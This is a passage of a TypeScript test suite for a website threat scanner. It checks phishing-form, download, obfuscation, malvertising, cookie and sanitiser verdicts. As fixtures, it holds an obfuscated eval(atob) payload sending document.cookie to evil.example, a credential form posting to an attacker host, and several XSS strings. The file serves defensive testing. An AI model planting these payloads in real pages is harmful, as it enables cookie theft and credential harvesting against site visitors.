  assert.equal(audit.hasMaliciousCookieBehavior, true);
  assert.ok(audit.maliciousCookieCount >= 1);
  assert.ok(sourceRes.sourceIntel.externalDataTransmissions?.some((t) => t.isHarmful));
  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.ok(scored.classification === 'HIGH' || scored.classification === 'CRITICAL');
});

// 63. Normal same-origin login form -> NOT flagged as phishing
test('63. Normal same-origin login form over HTTPS is not false-flagged as phishing', () => {
  const url = 'https://member-club.example/login';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Member Sign In</title></head><body>
      <h1>Welcome Back</h1>
      <form action="/api/auth/login" method="post">
        <input type="email" name="email" required />
        <input type="password" name="password" required />
        <button type="submit">Log In</button>
      </form>
    </body></html>`,
    'utf8'
  );
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html);
  const scored = computeRiskAndSections(contentRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 64. Login page with standard third-party OAuth widgets (Google/GitHub) -> NOT brand impersonation
test('64. Login page with standard OAuth widgets (Sign in with Google / GitHub) is not flagged as brand impersonation', () => {
  const url = 'https://indie-workspace.example/login';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Workspace Login</title></head><body>
      <h1>Sign in to Indie Workspace</h1>
      <button type="button" data-provider="google">Sign in with Google</button>
      <button type="button" data-provider="github">Continue with GitHub</button>
    </body></html>`,
    'utf8'
  );
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html);
  assert.ok((contentRes.data?.oauthWidgetsDetected?.length ?? 0) >= 1);
  assert.equal(contentRes.data?.suspectedBrand, undefined);
  const scored = computeRiskAndSections(contentRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 65. Cross-origin credential theft form with password -> HIGH/CRITICAL
test('65. Cross-origin password form submission to unknown external host escalates to HIGH or CRITICAL', () => {
  const url = 'https://fake-login-portal.example/signin';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Account Verification</title></head><body>
      <form action="https://harvester-drop.evil.example/capture" method="post">
        <input type="email" name="email" />
        <input type="password" name="password" />
        <input type="text" name="otp" />
        <button type="submit">Verify</button>
      </form>
    </body></html>`,
    'utf8'
  );
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html);
  assert.ok((contentRes.data?.crossOriginFormActions.length ?? 0) >= 1);
  const scored = computeRiskAndSections(contentRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.ok(scored.classification === 'HIGH' || scored.classification === 'CRITICAL');
});

// 66. Shared PaaS (up.railway.app) clean app -> riskScore 0, NO_KNOWN_THREATS, accurate hostingMetadata
test('66. Clean app on shared PaaS (*.up.railway.app) scores 0 with Independent Hosted Application metadata', () => {
  const url = 'https://my-clean-demo.up.railway.app/';
  const html = Buffer.from(`<!doctype html><html><head><title>Demo App</title></head><body>Hello World</body></html>`, 'utf8');
  const urlRes = analyzeUrlIntelligence(url, url);
  const contentRes = analyzeWebsiteContentAndBrand(url, 200, { 'content-type': 'text/html' }, html);
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const domainAuth = assessDomainAuthenticity({
    hostname: 'my-clean-demo.up.railway.app',
    dnsResolved: true,
    tlsAuthorized: true,
    tlsDomainMatches: true,
    tlsIssuer: "Let's Encrypt",
  });
  assert.equal(domainAuth.hostingMetadata?.isSharedPaas, true);
  assert.equal(domainAuth.hostingMetadata?.hostingProvider, 'Railway');
  assert.equal(domainAuth.hostingMetadata?.customDomainOwnership, 'unverified');
  assert.equal(domainAuth.hostingMetadata?.websiteIdentity.en, 'Independent Hosted Application');

  const scored = computeRiskAndSections([...urlRes.findings, ...contentRes.findings, ...sourceRes.findings], mockCleanProviders(), {
    finalUrl: url,
  });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 67. User-initiated clean download vs deceptive double extension / drive-by download
test('67. Clean user-initiated resource download passes with score 0 while deceptive executable double-extension escalates', () => {
  const cleanUrl = 'https://releases.example.org/manual.pdf';
  const pdfMagic = Buffer.from('%PDF-1.7\n1 0 obj\n<<>>\nendobj\n', 'utf8');
  const cleanFileRes = analyzeFileAndDownloads(
    cleanUrl,
    { 'content-type': 'application/pdf', 'content-disposition': 'attachment; filename="manual.pdf"' },
    pdfMagic
  );
  assert.equal(cleanFileRes.directFile?.downloadCategory, 'verified_safe_resource');
  const cleanScored = computeRiskAndSections(cleanFileRes.findings, mockCleanProviders(), { finalUrl: cleanUrl });
  assert.equal(cleanScored.riskScore, 0);
  assert.equal(cleanScored.classification, 'NO_KNOWN_THREATS');

  const csvUrl = 'https://releases.example.org/dataset.csv';
  const csvRes = analyzeFileAndDownloads(
    csvUrl,
    { 'content-type': 'text/csv', 'content-disposition': 'attachment; filename="dataset.csv"' },
    Buffer.from('id,name\n1,alpha\n', 'utf8')
  );
  assert.equal(csvRes.directFile?.downloadCategory, 'user_initiated_download');
  const csvScored = computeRiskAndSections(csvRes.findings, mockCleanProviders(), { finalUrl: csvUrl });
  assert.equal(csvScored.riskScore, 0);

  const badUrl = 'https://mal-drop.example/invoice.pdf.exe';
  const peMagic = Buffer.from([0x4d, 0x5a, 0x90, 0x00]); // MZ PE header
  const badFileRes = analyzeFileAndDownloads(badUrl, { 'content-type': 'application/octet-stream' }, peMagic);
  assert.equal(badFileRes.directFile?.downloadCategory, 'deceptive_download');
  const badScored = computeRiskAndSections(badFileRes.findings, mockCleanProviders(), { finalUrl: badUrl });
  assert.ok(badScored.classification === 'HIGH' || badScored.classification === 'CRITICAL');
});

// 68. eval(atob(...)) + exfiltration -> HIGH vs standalone non-tainted script -> not escalated
test('68. Obfuscated eval(atob(...)) payload escalates while clean bundled helper without sink avoids high penalty', () => {
  const badUrl = 'https://dropper.example/';
  const payload = Buffer.from("fetch('https://evil.example/c2?d='+document.cookie)").toString('base64');
  const badHtml = Buffer.from(
    `<!doctype html><html><head><title>Test</title></head><body>
      <script>eval(atob("${payload}"));</script>
    </body></html>`,
    'utf8'
  );
  const badSource = analyzeSourceIntelligence(badUrl, { 'content-type': 'text/html' }, badHtml);
  const badScored = computeRiskAndSections(badSource.findings, mockCleanProviders(), { finalUrl: badUrl });
  assert.ok(badScored.riskScore >= 30, `Expected high risk score on eval(atob), got ${badScored.riskScore}`);

  const cleanUrl = 'https://clean-bundle.example/';
  const cleanHtml = Buffer.from(
    `<!doctype html><html><head><title>App</title></head><body>
      <script>
        const label = window.atob("U2NhbiBMaW5r");
        document.getElementById('app').textContent = label;
      </script>
    </body></html>`,
    'utf8'
  );
  const cleanSource = analyzeSourceIntelligence(cleanUrl, { 'content-type': 'text/html' }, cleanHtml);
  const cleanScored = computeRiskAndSections(cleanSource.findings, mockCleanProviders(), { finalUrl: cleanUrl });
  assert.equal(cleanScored.riskScore, 0);
  assert.equal(cleanScored.classification, 'NO_KNOWN_THREATS');
});

// 69. AST call-graph click-bound helper calling getUserMedia -> triggeredOnEntry: false, score 0
test('69. AST call-graph tracks click-bound helper calling getUserMedia with score 0 vs auto on-entry bait', () => {
  const clickUrl = 'https://meeting-tool.example/call';
  const clickHtml = Buffer.from(
    `<!doctype html><html><head><title>Video Call</title></head><body>
      <button id="joinBtn">Join Camera</button>
      <script>
        async function startMedia() {
          return await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        }
        document.getElementById('joinBtn').addEventListener('click', () => startMedia());
      </script>
    </body></html>`,
    'utf8'
  );
  const clickRes = analyzeWebsiteContentAndBrand(clickUrl, 200, { 'content-type': 'text/html' }, clickHtml);
  assert.equal(clickRes.data?.permissionAudit?.triggeredOnEntry, false);
  const clickScored = computeRiskAndSections(clickRes.findings, mockCleanProviders(), { finalUrl: clickUrl });
  assert.equal(clickScored.riskScore, 0);

  const autoUrl = 'https://bait-page.example/';
  const autoHtml = Buffer.from(
    `<!doctype html><html><head><title>Prize</title></head><body>
      <script>navigator.mediaDevices.getUserMedia({ video: true });</script>
    </body></html>`,
    'utf8'
  );
  const autoRes = analyzeWebsiteContentAndBrand(autoUrl, 200, { 'content-type': 'text/html' }, autoHtml);
  assert.equal(autoRes.data?.permissionAudit?.triggeredOnEntry, true);
  assert.equal(autoRes.data?.permissionAudit?.riskEscalatedToHigh, true);
});

// 70. Malvertising popunder (popads.net) vs legitimate declared Google Analytics (declared_analytics)
test('70. Malvertising ad network (popads.net) flags malicious_advertising whereas declared Google Analytics yields 0 penalty', () => {
  const malUrl = 'https://stream-free.example/';
  const tagOnlyHtml = Buffer.from(
    `<!doctype html><html><head><title>Free Stream</title>
      <script src="https://c1.popads.net/pop.js"></script>
    </head><body>Watch</body></html>`,
    'utf8'
  );
  const tagOnlySource = analyzeSourceIntelligence(malUrl, { 'content-type': 'text/html' }, tagOnlyHtml);
  assert.equal(tagOnlySource.sourceIntel.advertisingIntel?.status, 'suspicious_advertising');

  const malHtml = Buffer.from(
    `<!doctype html><html><head><title>Free Stream</title>
      <script src="https://c1.popads.net/pop.js"></script>
      <script>window.open('https://c1.popads.net/popunder', '_blank', 'width=800,height=600'); window.blur();</script>
    </head><body>Watch</body></html>`,
    'utf8'
  );
  const malSource = analyzeSourceIntelligence(malUrl, { 'content-type': 'text/html' }, malHtml);
  assert.equal(malSource.sourceIntel.advertisingIntel?.status, 'malicious_advertising');
  const malScored = computeRiskAndSections(malSource.findings, mockCleanProviders(), { finalUrl: malUrl });
  assert.ok(malScored.riskScore >= 18);

  const analyticsUrl = 'https://news-site.example/';
  const analyticsHtml = Buffer.from(
    `<!doctype html><html><head><title>News</title>
      <script src="https://www.googletagmanager.com/gtag/js?id=G-ABC123"></script>
    </head><body>
      <div id="cookie-banner"><p>Analytics consent</p><button>Accept</button><button>Decline</button></div>
    </body></html>`,
    'utf8'
  );
  const analyticsSource = analyzeSourceIntelligence(
    analyticsUrl,
    { 'content-type': 'text/html' },
    analyticsHtml,
    undefined,
    ['_ga=GA1.2.1; Path=/']
  );
  assert.equal(analyticsSource.sourceIntel.advertisingIntel?.status, 'declared_analytics');
  const analyticsScored = computeRiskAndSections(analyticsSource.findings, mockCleanProviders(), {
    finalUrl: analyticsUrl,
  });
  assert.equal(analyticsScored.riskScore, 0);
});

// 71. CDN infrastructure (domain-ip-hosting) adds 0 penalty vs malicious Shodan tag
test('71. Hosting behind CDN/reverse proxy contributes 0 risk weight', () => {
  const cdnFinding: CheckFinding = {
    id: 'domain-ip-hosting',
    section: 'domain_intelligence',
    test: { en: 'Deep IP & CDN Intel', ar: 'فحص IP وCDN' },
    result: { en: 'Cloudflare CDN · 2 ports', ar: 'Cloudflare CDN' },
    status: 'pass',
    severity: 'informational',
    weight: 0,
    evidence: 'CDN/Proxy: Cloudflare',
    explanation: { en: 'Behind Cloudflare CDN', ar: 'خلف Cloudflare CDN' },
    recommendedAction: { en: 'None', ar: 'لا يوجد' },
    source: 'ARIN RDAP',
    timestamp: new Date().toISOString(),
    confidence: 90,
  };
  const malIpFinding: CheckFinding = {
    ...cdnFinding,
    status: 'failed',
    severity: 'high',
    weight: 25,
    evidence: 'Tags: [botnet, c2]',
  };
  assert.equal(computeRiskAndSections([cdnFinding], mockCleanProviders()).riskScore, 0);
  assert.ok(computeRiskAndSections([malIpFinding], mockCleanProviders()).riskScore >= 25);
});

// 72. Missing WHOIS / RDAP domain-age -> status unknown, weight 0, contributes 0 risk
test('72. Missing WHOIS/RDAP metadata produces unknown status with weight 0 and contributes zero risk', () => {
  const missingWhoisFinding: CheckFinding = {
    id: 'domain-age',
    section: 'domain_intelligence',
    test: { en: 'Domain Registration Age (RDAP / WHOIS)', ar: 'عمر تسجيل النطاق' },
    result: { en: 'RDAP/WHOIS registration metadata unavailable', ar: 'بيانات التسجيل غير متاحة' },
    status: 'unknown',
    severity: 'unknown',
    weight: 0,
    evidence: 'RDAP and WHOIS fallback returned no creation date',
    explanation: { en: 'Unavailable metadata', ar: 'بيانات غير متوفرة' },
    recommendedAction: { en: 'Treat unverified', ar: 'غير متحقق منه' },
    source: 'RDAP / WHOIS',
    timestamp: new Date().toISOString(),
    confidence: 25,
  };
  const safeContentFinding: CheckFinding = {
    id: 'content-lures',
    section: 'website_content',
    test: { en: 'Content Lures', ar: 'محتوى خادع' },
    result: { en: 'Clean', ar: 'سليم' },
    status: 'pass',
    severity: 'informational',
    weight: 0,
    evidence: '0 lures',
    explanation: { en: 'Clean page', ar: 'صفحة سليمة' },
    recommendedAction: { en: 'None', ar: 'لا شيء' },
    source: 'HTML Parser',
    timestamp: new Date().toISOString(),
    confidence: 90,
  };
  const scored = computeRiskAndSections([missingWhoisFinding, safeContentFinding], mockCleanProviders());
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 73. validateAndNormalizeReportConsistency eliminates contradictory exfil/malicious claims when underlying telemetry is clean
test('73. Consistency validator removes stale contradictory exfiltration notes and normalizes clean report state', () => {
  const now = new Date().toISOString();
  const baseReport = {
    scanId: 'test-consistency',
    submittedUrl: 'https://clean-site.example/',
    normalizedUrl: 'https://clean-site.example/',
    finalDestinationUrl: 'https://clean-site.example/',
    startedAt: now,
    completedAt: now,
    durationMs: 100,
    status: 'completed' as const,
    riskScore: 45,
    classification: 'MEDIUM' as const,
    verdict: 'Medium Risk' as const,
    confidenceScore: 90,
    confidenceLabel: 'High' as const,
    recommendation: { en: 'Test', ar: 'اختبار' },
    topReasons: [
      {
        en: 'Harmful Background Data Exfiltration detected in JS',
        ar: 'تسريب بيانات خبيث بالخلفية',
      },
    ],
    correlationNotes: [
      {
        en: 'Encrypted URL + Harmful Background Exfiltration detected',
        ar: 'تشفير رابط + تسريب بالخلفية',
      },
    ],
    evidenceBuckets: {
      confirmed: [
        { en: 'Harmful Background Data Exfiltration confirmed', ar: 'تأكيد تسريب بيانات خبيث' },
      ],
      suspicious: [],
      inconclusive: [],
      conflicting: [],
    },
    summaryStats: {
      totalChecks: 1,
      passedChecks: 1,
      warningChecks: 0,
      failedChecks: 0,
      criticalFindings: 0,
      incompleteChecks: 0,
      availableProviders: 2,
      totalProviders: 2,
    },
    sections: [],
    findings: [
      {
        id: 'source-cookie-audit',
        section: 'source_intelligence',
        test: { en: 'Cookie Audit', ar: 'فحص الكوكيز' },
        result: { en: 'Clean', ar: 'سليم' },
        status: 'failed',
        severity: 'high',
        weight: 25,
        evidence: 'Essential cookies only',
        explanation: { en: 'Clean', ar: 'سليم' },
        recommendedAction: { en: 'None', ar: 'لا شيء' },
        source: 'Cookie Intelligence',
        timestamp: now,
        confidence: 95,
      },
    ],
    redirects: [],
    sourceIntel: {
      ogTags: {},
      jsonLdCount: 0,
      jsonLdTypes: [],
      baseTagHijack: false,
      securityHeaders: {},
      externalJsFiles: [],
      externalCssFiles: [],
      inlineJsCount: 0,
      inlineCssCount: 0,
      iframeSources: [],
      embeddedResources: [],
      hiddenInputs: [],
      suspiciousAttributes: [],
      suspiciousCodeSignals: [],
      lureExcerpts: [],
      externalDataTransmissions: [
        {
          destinationUrl: 'https://clean-site.example/api/ping',
          destinationHost: 'clean-site.example',
          destinationScope: 'same_origin',
          method: 'fetch',
          obfuscatedUrl: false,
          isThirdParty: false,
          relationshipStatus: 'same_organization',
          pairedWithBackgroundCollection: false,
          transmittedDataTypes: ['functional_state'],
          harmClassification: 'benign_functional',
          isHarmful: false,
          harmAssessment: { en: 'Benign', ar: 'سليم' },
          excerpt: 'fetch("/api/ping")',
          detail: { en: 'Same-origin ping', ar: 'اتصال لنفس النطاق' },
        },
      ],
      cookieAudit: {
        totalCookiesInspected: 1,
        httpSetCookieCount: 1,
        jsCookieWriteCount: 0,
        jsCookieReadCount: 0,
        setsAdvertisingCookies: false,
        hasMaliciousCookieBehavior: false,
        hasConsentNoticeOrBanner: false,
        essentialFunctionalCount: 1,
        adCookieCount: 0,
        maliciousCookieCount: 0,
        cookieStuffingSignals: [],
        cookiesDetected: [],
        summary: { en: 'Essential only', ar: 'تشغيلي فقط' },
      },
    },
    fileAnalysis: {
      isDirectDownload: false,
      discoveredDownloads: [],
      dynamicAnalysisPerformed: false,
      sandboxNote: { en: 'Static', ar: 'ساكن' },
    },
    threatProviders: mockCleanProviders(),
    screenshot: {
      status: 'unavailable',
      method: 'none',
      viewport: 'desktop',
      finalDestinationUrl: 'https://clean-site.example/',
    },
    sandboxCapabilities: {
      ssrfGuardActive: true,
      isolatedBrowserWorker: false,
      screenshotFallbackConfigured: false,
      dynamicFileSandbox: false,
      inspectionMode: 'controlled_server_fetch',
      disclosure: { en: 'Static worker', ar: 'فحص ساكن' },
    },
  } as unknown as ScanReport;

  const normalized = validateAndNormalizeReportConsistency(baseReport);
  assert.equal(normalized.riskScore, 0);
  assert.equal(normalized.classification, 'NO_KNOWN_THREATS');
  assert.equal(normalized.findings[0].status, 'pass');
  assert.equal(normalized.correlationNotes.length, 0);
  assert.ok(!normalized.topReasons!.some((r) => /Harmful Background Data Exfiltration/i.test(r.en)));
  assert.equal(normalized.summaryStats.failedChecks, 0);
  assert.equal(normalized.summaryStats.passedChecks, 1);
});

// 74. Full pipeline Level A static completion vs Level B honest unavailable disclosure
test('74. Level A static vs Level B isolated browser capabilities are accurately reflected end-to-end', async () => {
  const app = await createApp({ enableVite: false });
  assert.ok(app, 'Express app should initialize cleanly with security intelligence routes');

  const url = 'https://level-check.example/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Level Test</title></head><body>
      <script>window.__APP_DATA__ = {};</script>
    </body></html>`,
    'utf8'
  );
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  assert.ok(sourceRes.sourceIntel.cookieAudit, 'Level A static always populates cookieAudit');
  assert.ok(sourceRes.sourceIntel.advertisingIntel, 'Level A static always populates advertisingIntel');
  assert.ok(sourceRes.sourceIntel.workersDetected, 'Level A static always populates workersDetected');
});

// 75. Ad/analytics cookies with consent banner rendered inside external JS -> pass, 0 weight, NO_KNOWN_THREATS
test('75. Consent notice detected inside external JS satisfies ad/analytics cookie consent with score 0', () => {
  const url = 'https://spa-store.example/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>SPA Store</title></head><body><div id="root"></div></body></html>`,
    'utf8'
  );
  const extAssets = {
    fetchedScripts: [
      {
        url: 'https://spa-store.example/assets/consent-banner.js',
        code: `function Banner() { return "We use cookies to personalize ads and analytics. Accept All | Reject All"; }`,
      },
    ],
  };
  const rawSetCookies = ['_fbp=fb.1.123.456; Path=/; Secure', '_ga=GA1.2.999.888; Path=/; Secure'];
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, extAssets, rawSetCookies);
  const audit = sourceRes.sourceIntel.cookieAudit;
  assert.ok(audit);
  assert.equal(audit.hasConsentNoticeOrBanner, true);
  assert.equal(audit.hasMaliciousCookieBehavior, false);
  const cookieFinding = sourceRes.findings.find((f) => f.id === 'source-cookie-audit');
  assert.equal(cookieFinding?.status, 'pass');
  assert.equal(cookieFinding?.weight, 0);

  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 76. Benign base64 preference cookie write & absent-consent ad cookies stay warning-only without escalating risk classification
test('76. Non-malicious encoded cookie write and missing-consent ad cookies stay warning-only with 0 classification escalation', () => {
  const url = 'https://publisher-portal.example/';
  const benignEncodedVal = Buffer.from('{"theme":"dark","lang":"ar"}', 'utf8').toString('base64');
  const html = Buffer.from(
    `<!doctype html><html><head><title>Publisher News</title></head><body>
      <h1>Daily Articles</h1>
      <script>
        document.cookie = "ui_prefs=" + atob("${benignEncodedVal}") + "; path=/";
      </script>
    </body></html>`,
    'utf8'
  );
  const rawSetCookies = ['_gads=ID=abc:T=123; Path=/'];
  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html, undefined, rawSetCookies);
  const audit = sourceRes.sourceIntel.cookieAudit;
  assert.ok(audit);
  assert.equal(audit.hasMaliciousCookieBehavior, false);
  const cookieFinding = sourceRes.findings.find((f) => f.id === 'source-cookie-audit');
  assert.equal(cookieFinding?.status, 'warning');
  assert.equal(cookieFinding?.weight, 0);

  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 77. Centralized CorrelationEngine deduplicates overlaps & enforces strict HIGH (70+) gate on unconfirmed signals
test('77. CorrelationEngine prevents double penalties and clamps preliminary signals strictly below HIGH (70)', () => {
  const findings: CheckFinding[] = [
    {
      id: 'brand-impersonation',
      section: 'brand_impersonation',
      test: { en: 'Brand Impersonation', ar: 'انتحال العلامة' },
      result: { en: 'Similarity heuristic', ar: 'تشابه أولي' },
      status: 'warning',
      severity: 'medium',
      weight: 30,
      evidence: 'SimilarityOnly: true',
      explanation: { en: 'Similarity noted', ar: 'تشابه أولي' },
      recommendedAction: { en: 'Verify official domain', ar: 'تحقق من النطاق' },
      confidence: 70,
      source: 'Brand Analyzer',
      timestamp: new Date().toISOString(),
    },
    {
      id: 'deception-homograph-confusables',
      section: 'domain_deception',
      test: { en: 'Homograph Check', ar: 'فحص التطابق' },
      result: { en: 'Similarity warning', ar: 'تحذير تشابه' },
      status: 'warning',
      severity: 'medium',
      weight: 28,
      evidence: 'SimilarityOnly: true',
      explanation: { en: 'Confusable similarity noted', ar: 'تشابه أحرف' },
      recommendedAction: { en: 'Inspect hostname', ar: 'فحص اسم النطاق' },
      confidence: 70,
      source: 'Deception Analyzer',
      timestamp: new Date().toISOString(),
    },
    {
      id: 'domain-whois-age',
      section: 'domain_intelligence',
      test: { en: 'Domain Age', ar: 'عمر النطاق' },
      result: { en: 'Newly registered domain', ar: 'نطاق حديث' },
      status: 'warning',
      severity: 'medium',
      weight: 24,
      evidence: 'Age: 3 days',
      explanation: { en: 'Domain registered recently', ar: 'نطاق مسجل حديثا' },
      recommendedAction: { en: 'Proceed with caution', ar: 'توخ الحذر' },
      confidence: 80,
      source: 'Domain Intel',
      timestamp: new Date().toISOString(),
    },
    {
      id: 'source-obfuscation',
      section: 'source_intelligence',
      test: { en: 'Obfuscation', ar: 'تعمية الكود' },
      result: { en: 'Packed JS bundle', ar: 'حزمة مضغوطة' },
      status: 'warning',
      severity: 'medium',
      weight: 22,
      evidence: 'Minified bundle',
      explanation: { en: 'Bundled JavaScript detected', ar: 'تم رصد حزمة مضغوطة' },
      recommendedAction: { en: 'Review bundle source', ar: 'راجع المصدر' },
      confidence: 65,
      source: 'Source Analyzer',
      timestamp: new Date().toISOString(),
    },
  ];

  const correlated = CorrelationEngine.correlateFindingsAndCalibrateScore({
    findings,
    providers: mockCleanProviders(),
    strongRiskScore: 0,
    weakSignalScore: 95,
    weakSignalContribution: 85,
    failedChecks: 0,
    baseScoreBreakdown: [],
    context: { finalUrl: 'https://new-portal.example/' },
  });

  assert.equal(correlated.hasConfirmedSevereEvidence, false);
  assert.ok(correlated.riskScore < 70, `Expected score strictly < 70 without confirmed severe evidence, got ${correlated.riskScore}`);
  assert.ok(correlated.scoreBreakdown.some((entry) => entry.id === 'dedup-similarity-only' && entry.delta < 0));

  const scored = computeRiskAndSections(findings, mockCleanProviders(), { finalUrl: 'https://new-portal.example/' });
  assert.ok(scored.riskScore < 70);
  assert.notEqual(scored.classification, 'HIGH');
  assert.notEqual(scored.classification, 'CRITICAL');
});

// 78. Same-origin login fetch, same-origin WebSocket, Vite dev HMR endpoints, and benign token state stay NO_KNOWN_THREATS
test('78. Same-origin login, WebSocket, Vite HMR endpoints, and benign UI tokens yield riskScore 0', () => {
  const url = 'https://app-portal.example/login';
  const html = Buffer.from(
    `<!doctype html><html><head><title>App Portal</title></head><body>
      <form action="/api/login" method="POST">
        <input type="email" name="email" />
        <input type="password" name="password" />
        <button type="submit">Sign In</button>
      </form>
      <script type="module" src="/@vite/client"></script>
      <script>
        const designToken = "color-accent-primary";
        const ws = new WebSocket("wss://app-portal.example/ws");
        async function doLogin(email, password) {
          return fetch("/api/login", { method: "POST", body: JSON.stringify({ email, password }) });
        }
        fetch("/vite-hmr");
        localStorage.setItem("scanlink_theme", "dark");
      </script>
    </body></html>`,
    'utf8'
  );

  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const bgExfilFinding = sourceRes.findings.find((f) => f.id === 'source-bg-exfiltration');
  const formHijackFinding = sourceRes.findings.find((f) => f.id === 'source-form-hijacking');

  assert.notEqual(bgExfilFinding?.status, 'failed');
  assert.notEqual(formHijackFinding?.status, 'failed');
  assert.equal(
    (sourceRes.sourceIntel.externalDataTransmissions ?? []).filter((t) => t.harmClassification === 'malicious_harmful').length,
    0
  );

  const scored = computeRiskAndSections(sourceRes.findings, mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 79. Shared PaaS hosting (railway.app) + unconfigured optional threat keys (auth_required) stay NO_KNOWN_THREATS with 0 risk
test('79. Shared PaaS (railway.app) with valid HTTPS and unconfigured optional API keys scores 0 (NO_KNOWN_THREATS)', () => {
  const url = 'https://my-scan-app.up.railway.app/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>My Scan App</title></head><body>
      <h1>Welcome</h1>
      <script>fetch('/api/health').then(r => r.json());</script>
    </body></html>`,
    'utf8'
  );

  const sourceRes = analyzeSourceIntelligence(
    url,
    {
      'content-type': 'text/html',
      'content-security-policy': "default-src 'self'; script-src 'self'",
    },
    html
  );
  const urlRes = analyzeUrlIntelligence(url, url);
  const findings: CheckFinding[] = [
    ...urlRes.findings,
    ...sourceRes.findings,
    {
      id: 'domain-whois-age',
      section: 'domain_intelligence',
      test: { en: 'Domain Age', ar: 'عمر النطاق' },
      result: { en: 'Shared PaaS domain', ar: 'استضافة سحابية مشتركة' },
      status: 'pass',
      severity: 'informational',
      weight: 0,
      evidence: 'Multi-tenant PaaS: railway.app',
      explanation: { en: 'Shared cloud PaaS host', ar: 'استضافة سحابية مشتركة' },
      recommendedAction: { en: 'No action needed', ar: 'لا يلزم إجراء' },
      confidence: 90,
      source: 'Domain Intel',
      timestamp: new Date().toISOString(),
    },
  ];

  const unconfiguredProviders: ThreatProviderResult[] = [
    {
      providerId: 'virustotal',
      providerName: 'VirusTotal API v3',
      category: 'Multi-Engine Reputation',
      enabled: true,
      configured: false,
      operationalState: 'auth_required',
      status: 'auth_required',
      verdictDetail: { en: 'API key not configured', ar: 'مفتاح API غير مضاف' },
      requiresKey: true,
    },
    {
      providerId: 'urlhaus',
      providerName: 'URLhaus (abuse.ch)',
      category: 'Malware URLs',
      enabled: true,
      configured: false,
      operationalState: 'auth_required',
      status: 'auth_required',
      verdictDetail: { en: 'API key not configured', ar: 'مفتاح API غير مضاف' },
      requiresKey: true,
    },
  ];

  const scored = computeRiskAndSections(findings, unconfiguredProviders, {
    finalUrl: url,
    redirects: [
      {
        step: 1,
        url,
        hostname: 'my-scan-app.up.railway.app',
        protocol: 'https:',
        statusCode: 200,
        crossDomain: false,
        downgradedToHttp: false,
        latencyMs: 25,
      },
    ],
    tlsData: {
      httpsAvailable: true,
      authorized: true,
      protocol: 'TLSv1.3',
      expired: false,
      daysRemaining: 82,
      issuer: "Let's Encrypt",
      subjectCN: '*.up.railway.app',
      sanList: ['*.up.railway.app'],
    },
  });

  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 80. Client sanitize helpers block dangerous URI schemes & malformed data URLs while preserving safe URIs
test('80. Sanitization helpers reject javascript:/vbscript:/data:text/html/raw-svg and allow safe HTTPS & base64 images', () => {
  assert.equal(safeExternalHref('javascript:alert(1)'), undefined);
  assert.equal(safeExternalHref('  JaVaScRiPt:alert(document.cookie)'), undefined);
  assert.equal(safeExternalHref('vbscript:msgbox(1)'), undefined);
  assert.equal(safeExternalHref('data:text/html,<script>alert(1)</script>'), undefined);
  assert.equal(safeExternalHref('https://example.com/report?id=1'), 'https://example.com/report?id=1');

  assert.equal(safeImageDataUrl('data:image/svg+xml,<svg onload=alert(1)>'), undefined);
  assert.equal(safeImageDataUrl('javascript:alert(1)'), undefined);
  const validPngData = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';
  assert.equal(safeImageDataUrl(validPngData), validPngData);

  assert.equal(sanitizeUrlParamForScan('javascript:alert(1)'), undefined);
  assert.equal(sanitizeUrlParamForScan('data:text/html,xss'), undefined);
  assert.equal(sanitizeUrlParamForScan('https://target.example/path'), 'https://target.example/path');

  const sanitizedReport = sanitizeSavedReport({
    id: 'scan-1',
    submittedUrl: 'https://target.example/\u0007',
    normalizedUrl: 'https://target.example/',
    finalDestinationUrl: 'https://target.example/',
    siteFaviconDataUrl: 'data:image/svg+xml,<svg onload=alert(1)>',
    siteFaviconSourceUrl: 'javascript:alert(1)',
    threatProviders: [
      {
        providerId: 'vt',
        providerName: 'VT',
        category: 'Reputation',
        enabled: true,
        configured: true,
        operationalState: 'active',
        status: 'clean',
        verdictDetail: { en: 'Clean', ar: 'سليم' },
        requiresKey: true,
        referenceUrl: 'javascript:alert(2)',
      },
    ],
  } as unknown as ScanReport);

  assert.equal(sanitizedReport.submittedUrl, 'https://target.example/');
  assert.equal(sanitizedReport.siteFaviconDataUrl, undefined);
